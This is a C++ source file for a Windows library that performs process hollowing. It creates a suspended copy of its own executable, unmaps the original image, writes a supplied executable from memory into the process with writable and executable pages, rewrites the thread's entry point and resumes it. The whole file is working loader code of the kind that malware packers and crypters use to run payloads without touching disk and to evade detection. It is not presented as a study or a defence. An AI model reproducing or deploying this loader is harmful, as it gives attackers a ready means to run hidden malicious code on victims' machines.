#include "ProcessLibrary.h"
#include "../PebLibrary/PebLibrary.h"
#include "../DebugLibrary/DebugLibrary.h"

#include <string>
#include <iostream>

/* defined in <ntstatus.h>. Redefine it here to avoid conflicts between other definitions in <ntstatus.h> and <windows.h> */
#define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L)    // ntsubauth

typedef NTSTATUS(NTAPI* NtUnmapViewOfSectionFunc)(HANDLE, PVOID);

bool ProcessLibrary::CreateHollowProcess(HMODULE& pBaseAddr_, PROCESS_INFORMATION& pInfo_)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));

	si.cb = sizeof(si);

	wchar_t* pathToExeFile = new wchar_t[MAX_PATH];
	GetModuleFileName(NULL, pathToExeFile, MAX_PATH);

	std::wstring pathToExeFileStr(pathToExeFile);
	delete[] pathToExeFile;

	/* CreateProcess gives PROCESS_ALL_ACCESS rights for created process */
	if (!CreateProcess(nullptr, pathToExeFileStr.data(), nullptr, nullptr, false, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, 0, 0, &si, &pi))
	{
		EW_LOG_WIN_ERROR(L"Can't create the process!");

		return false;
	}

	//PPEB peb = WinApiFunctions::NTDLL_GetPEB(pi);
	PPEB peb = PebLibrary::CONTEXT_GetPEB(pi);
	HMODULE pBaseAddr = PebLibrary::GetProcessBaseAddress(pi, peb);

	/* Clean process memory */
	if (!NtUnmapViewOfSection(pi.hProcess, pBaseAddr))
	{
		EW_LOG_WIN_ERROR(L"Can't unmap!");

		TerminateProcess(pi.hProcess, 0);
		return false;
	}

	pBaseAddr_ = pBaseAddr;
	pInfo_ = pi;

	return true;
}

LPVOID ProcessLibrary::WriteProcessPages(const PROCESS_INFORMATION& _pInfo, const PIMAGE_NT_HEADERS32& _ntHeader, const HMODULE _pBaseAddr, const char* _buffer)
{
	LPVOID allocPtr = VirtualAllocEx(_pInfo.hProcess, _pBaseAddr, _ntHeader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!allocPtr)
	{
		EW_LOG_WIN_ERROR(L"Can't alloc memory!");

		return nullptr;
	}

	if (!WriteProcessMemory(_pInfo.hProcess, allocPtr, _buffer, _ntHeader->OptionalHeader.SizeOfHeaders, 0))
	{
		EW_LOG_WIN_ERROR(L"Can't write process memory!");

		return nullptr;
	}

	PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(_ntHeader);

	for (int i = 0; i < _ntHeader->FileHeader.NumberOfSections; i++)
	{
		SIZE_T bytes;
		bool result = WriteProcessMemory(_pInfo.hProcess, PCHAR(allocPtr) + sect[i].VirtualAddress, PCHAR(_buffer) + sect[i].PointerToRawData, sect[i].SizeOfRawData, &bytes);

		if (!result)
		{
			EW_LOG_WIN_ERROR(L"Can't write memory at header index %d!", i);

			return nullptr;
		}

		DWORD prevProtect;
		result = VirtualProtectEx(_pInfo.hProcess, PCHAR(allocPtr) + sect[i].VirtualAddress, sect[i].Misc.VirtualSize, sect[i].Characteristics, &prevProtect);

		if (!result)
		{
			/* can't change protection of some sections. wtf? */
			EW_LOG_WIN_ERROR(L"Can't change page's protection at header index %d!", i);
			/*
			TerminateProcess(pi.hProcess, 0);
			return nullptr;
			*/
		}
	}

	return allocPtr;
}

bool ProcessLibrary::Wow64_CreateProcess(char* _exeBytes)
{
	HMODULE pBaseAddr = NULL;
	PROCESS_INFORMATION pi;

	if (!CreateHollowProcess(pBaseAddr, pi))
	{
		return false;
	}

	char* buffer = _exeBytes;

	PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer);
	PIMAGE_NT_HEADERS32 ntHeader = reinterpret_cast<PIMAGE_NT_HEADERS32>((reinterpret_cast<char*>(dosHeader) + dosHeader->e_lfanew));

	LPVOID allocPtr = WriteProcessPages(pi, ntHeader, pBaseAddr, buffer);

	if (!allocPtr)
	{
		TerminateProcess(pi.hProcess, 0);
		return false;
	}

	WOW64_CONTEXT context = { CONTEXT_INTEGER };
	context.ContextFlags = CONTEXT_ALL;

	if (!Wow64GetThreadContext(pi.hThread, &context))
	{
		EW_LOG_WIN_ERROR(L"Can't get thread context!");

		TerminateProcess(pi.hProcess, 0);
		return false;
	}

	context.Eax = (DWORD)allocPtr + ntHeader->OptionalHeader.AddressOfEntryPoint;

	if (!Wow64SetThreadContext(pi.hThread, &context))
	{
		EW_LOG_WIN_ERROR(L"Can't set thread context!");

		TerminateProcess(pi.hProcess, 0);
		return false;
	}

	ResumeThread(pi.hThread);

	return true;
}

#if _WIN64
bool ProcessLibrary::x64_CreateProcess(char* _exeBytes)
{
	HMODULE pBaseAddr = NULL;
	PROCESS_INFORMATION pi;

	if (!CreateHollowProcess(pBaseAddr, pi))
	{
		return false;
	}

	char* buffer = _exeBytes;

	PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer);
	PIMAGE_NT_HEADERS32 ntHeader = reinterpret_cast<PIMAGE_NT_HEADERS32>((reinterpret_cast<char*>(dosHeader) + dosHeader->e_lfanew));

	LPVOID allocPtr = WriteProcessPages(pi, ntHeader, pBaseAddr, buffer);

	if (!allocPtr)
	{
		TerminateProcess(pi.hProcess, 0);
		return false;
	}

	CONTEXT context = { CONTEXT_INTEGER };
	context.ContextFlags = CONTEXT_ALL;

	if (!GetThreadContext(pi.hThread, &context))
	{
		EW_LOG_WIN_ERROR(L"Can't get thread context!");

		TerminateProcess(pi.hProcess, 0);
		return false;
	}

	context.Rcx = reinterpret_cast<DWORD64>(allocPtr) + ntHeader->OptionalHeader.AddressOfEntryPoint;

	if (!SetThreadContext(pi.hThread, &context))
	{
		EW_LOG_WIN_ERROR(L"Can't set thread context!");

		TerminateProcess(pi.hProcess, 0);
		return false;
	}

	ResumeThread(pi.hThread);

	return true;
}
#endif

bool ProcessLibrary::CreateProcessFromRam(char* _exeBytes)
{
#if _WIN64
	/* x64 app on x64 system */
	return x64_CreateProcess(_exeBytes);
#else
	if (BOOL isSelfWow = false; IsWow64Process(GetCurrentProcess(), &isSelfWow) && isSelfWow)
	{
		/* x32 app on x64 system */
		return Wow64_CreateProcess(_exeBytes);
	}
	else
	{
		/* x32 app on x32 system */
		EW_LOG(L"x32 systems are not supported!");
	}
#endif

	return false;
}

bool ProcessLibrary::NtUnmapViewOfSection(const HANDLE _processHandle, const PVOID _baseAddress)
{
	HMODULE hNTDLL = GetModuleHandleW(L"ntdll.dll");

	if (!hNTDLL)
	{
		EW_LOG_WIN_ERROR(L"Can't find loaded ntdll.dll!");
		return false;
	}

	FARPROC functionPtr = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

	if (!functionPtr)
	{
		EW_LOG_WIN_ERROR(L"Can't find NtUnmapViewOfSection function!");
		return false;
	}

	NtUnmapViewOfSectionFunc NtUnmapViewOfSectionPtr = reinterpret_cast<NtUnmapViewOfSectionFunc>(functionPtr);

	return NtUnmapViewOfSectionPtr(_processHandle, _baseAddress) == STATUS_SUCCESS;
}